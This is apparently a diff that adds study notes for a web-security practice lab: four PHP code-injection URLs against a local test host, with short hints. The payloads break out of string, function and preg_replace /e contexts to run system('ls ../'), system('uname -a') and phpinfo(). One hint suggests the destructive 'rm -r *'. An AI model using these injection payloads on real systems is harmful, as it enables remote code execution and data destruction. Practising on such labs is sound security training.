@@ -1,0 +1,8 @@
+http://192.168.184.128/codeexec/example1.php?name=hacker";system('ls ../');$b=" 
+[can also try 'rm -r *' or 'sleep(10)' or 'uname -a']
+http://192.168.184.128/codeexec/example2.php?order=id);}system('uname -a');//   
+[use } to close current function; use // to ignore code behind]
+http://192.168.184.128/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer  
+[see the usage of preg_replace() and /e tag in php; hacker->phpinfo(); add e after /lamer/]
+http://192.168.184.128/codeexec/example4.php?name=hacker'.system('uname -a').'  
+[break the syntax and reconstruct it correctly, use . to concat string]
